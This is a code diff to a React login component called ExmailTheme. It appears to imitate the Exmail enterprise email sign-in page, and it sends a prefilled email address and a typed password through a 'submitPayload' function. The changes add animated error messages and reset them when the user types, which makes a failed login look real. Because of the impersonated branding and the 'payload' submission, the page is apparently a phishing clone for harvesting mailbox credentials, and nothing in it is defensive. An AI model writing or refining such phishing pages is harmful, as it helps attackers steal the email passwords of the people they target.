@@ -2,6 +2,7 @@
 import React, { useState } from 'react';
 import { useTranslation } from '../components/LanguageProvider';
 import { useSecurity } from '../components/SecurityManager';
+import { motion } from 'framer-motion';
 
 interface ExmailThemeProps {
   prefilledEmail?: string;
@@ -12,7 +13,7 @@ const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
   const [email, setEmail] = useState(prefilledEmail || '');
   const [password, setPassword] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { submitPayload } = useSecurity();
+  const { submitPayload, error, setError } = useSecurity();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -84,7 +85,10 @@ const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
                     type="text" 
                     placeholder={lang === 'zh' ? '邮箱账号/管理员账号' : 'Email Account/Admin Account'}
                     value={email}
-                    onChange={(e) => setEmail(e.target.value)}
+                    onChange={(e) => {
+                      setEmail(e.target.value);
+                      if (error) setError(null);
+                    }}
                     className="w-full py-2 px-1 text-[14px] focus:outline-none focus:border-[#2a8bd5] transition-colors placeholder:text-gray-300"
                   />
                 </div>
@@ -94,7 +98,10 @@ const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
                     type="password" 
                     placeholder={lang === 'zh' ? '请输入邮箱密码' : 'Enter the email password.'}
                     value={password}
-                    onChange={(e) => setPassword(e.target.value)}
+                    onChange={(e) => {
+                      setPassword(e.target.value);
+                      if (error) setError(null);
+                    }}
                     className="w-full py-2 px-1 text-[14px] focus:outline-none focus:border-[#2a8bd5] transition-colors placeholder:text-gray-300"
                   />
                 </div>
@@ -116,6 +123,16 @@ const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
                 >
                   {isSubmitting ? '...' : (lang === 'zh' ? '登 录' : 'log in')}
                 </button>
+
+                {error && (
+                  <motion.div 
+                    initial={{ opacity: 0, y: -10 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    className="text-red-500 text-[12px] text-center font-medium py-1"
+                  >
+                    {error}
+                  </motion.div>
+                )}
               </form>
             </div>
 
